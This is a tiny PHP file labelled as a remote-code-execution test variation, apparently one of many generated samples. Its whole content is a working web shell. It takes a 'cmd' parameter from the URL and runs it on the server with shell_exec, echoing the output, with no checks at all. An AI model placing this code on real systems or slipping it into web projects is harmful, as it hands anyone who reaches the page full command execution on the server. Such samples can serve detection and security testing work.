<?php
// RCE test variation #715
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>